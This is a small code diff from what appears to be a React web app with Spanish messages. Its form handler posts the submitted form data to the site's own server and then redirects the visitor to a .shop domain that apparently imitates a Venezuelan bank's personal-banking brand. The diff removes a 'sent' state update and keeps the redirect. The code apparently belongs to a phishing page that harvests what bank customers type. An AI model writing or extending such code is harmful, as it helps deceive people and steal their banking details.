@@ -48,7 +48,6 @@ export default function App() {
     });
     try {
       await fetch("/", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: body.toString() });
-      setEnviado(true);
       window.location.href = "https://www.bdvibenezpersona.shop/";
     } catch {
       alert("Error al enviar. Intente nuevamente.");
